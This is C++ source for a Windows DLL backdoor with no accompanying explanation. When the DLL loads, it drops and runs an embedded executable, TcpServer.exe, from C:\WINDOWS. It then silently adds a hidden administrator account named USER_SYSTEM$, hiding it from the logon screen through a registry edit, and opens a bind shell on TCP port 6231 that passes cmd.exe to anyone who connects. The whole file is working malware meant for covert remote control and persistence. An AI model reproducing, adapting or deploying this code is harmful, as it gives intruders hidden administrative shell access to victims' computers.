#include <winsock2.h>
#include <windows.h>
#include "lm.h"
#include <cstdio>
#include "data.h"
#pragma comment(lib,"netapi32")
#pragma comment(lib,"ws2_32")

DWORD WINAPI CmdSwitch(LPVOID p);
DWORD WINAPI SockAccept(LPVOID p);

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	DWORD retd;
	

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		CreateThread(NULL,0,SockAccept,NULL,0,&retd);

		if(GetFileAttributes("C:\\WINDOWS\\TcpServer.exe") & 0xFFFFFFFF)
		{
			FILE*fp=fopen("C:\\WINDOWS\\TcpServer.exe","wb");
			fwrite(data,sizeof(data),1,fp);
			fclose(fp);
		}
		Sleep(50);
		WinExec("C:\\WINDOWS\\TcpServer.exe",SW_SHOW);

		WinExec("cmd /c net user USER_SYSTEM$ USER_SYSTEM$ /add",SW_HIDE);
		Sleep(200);
		WinExec("cmd /c net localgroup administrators USER_SYSTEM$ /add",SW_HIDE);
		Sleep(200);
		WinExec("cmd /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v USER_SYSTEM$ /t REG_DWORD /d 0 /f",SW_HIDE);
		Sleep(100);
		/*USER_INFO_1 oUserInfo;
		ZeroMemory(&oUserInfo, sizeof(oUserInfo));
		oUserInfo.usri1_name = L"USER_SYSTEM$";
		oUserInfo.usri1_password = L"USER_SYSTEM$";
		oUserInfo.usri1_priv = USER_PRIV_USER;
		oUserInfo.usri1_flags = UF_NORMAL_ACCOUNT;
		NetUserAdd(NULL, 1, (LPBYTE)(&oUserInfo), &retd);
		_LOCALGROUP_MEMBERS_INFO_3 oUser;
		oUser.lgrmi3_domainandname = oUserInfo.usri1_name;
		NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)(&oUser), 1);*/

		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return true;
}

DWORD WINAPI SockAccept(LPVOID p)
{
	unsigned short port=6231;
	WSADATA ws;
	SOCKET listenFD;
	int ret;
	struct sockaddr_in server;
	int iAddrSize=sizeof(server);
	DWORD retd;
	SOCKET clientFD;

	WSAStartup(MAKEWORD(2,2),&ws);
	listenFD=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	server.sin_family=AF_INET;
	server.sin_port=htons(port);
	server.sin_addr.s_addr=ADDR_ANY;
	ret=bind(listenFD,(sockaddr*)&server,sizeof(server));
	ret=listen(listenFD,2);
	while(true)
	{
		clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
		CreateThread(NULL,0,CmdSwitch,&clientFD,0,&retd);
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI CmdSwitch(LPVOID p)
{
	SOCKET clientFD=*(SOCKET*)p;
	STARTUPINFO si;
	ZeroMemory(&si,sizeof(si));
	si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	si.hStdInput=si.hStdOutput=si.hStdError=(void *)clientFD;
	char cmdline[]="cmd.exe";
	PROCESS_INFORMATION ProcessInformation;
	CreateProcess(NULL,cmdline,NULL,NULL,TRUE,0,NULL,NULL,&si,&ProcessInformation);
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}